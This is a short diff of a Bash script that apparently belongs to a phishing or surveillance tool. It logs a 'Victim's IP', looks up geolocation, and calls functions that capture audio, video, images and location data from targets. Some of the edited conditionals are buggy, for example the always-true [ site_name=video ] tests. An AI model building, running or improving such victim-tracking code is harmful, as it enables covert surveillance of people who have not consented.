@@ -468,8 +468,6 @@ capture_data_check(){
                 capture_data_audio
         elif [ site_name=video ];then
                 capture_data_video
-	elif [ site_name=video ];then
-	        capture_data_video_audio
 	else
 	    	echo " Error Occured!!"
         fi
@@ -480,7 +478,13 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-				ip_details
+				if [ reply_tunnel=1 ]; then
+					echo -ne "${RED} IP's details cannot be captured in localhost server"
+				elif [ reply_tunnel=01 ]; then
+					echo -ne "${RED} IP's details cannot be captured in localhost server"
+				else
+					ip_details
+				fi
 	logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 	mkdir ${logs_dir}
 	mv ${logs_dir} ${files_dir}/${site_name}
@@ -544,7 +548,8 @@ ip_details() {
 	if [[ $region != "" ]]; then
 	echo -e "\n${GREEN} State: ${NC} $region"
 	fi
-	mv track.txt ${logs_full_dir}
+	mv track.txt ${logs_full_dir}\
+	mv location.txt ${logs_full_dir}\
 }
 
 capture_data_image() {
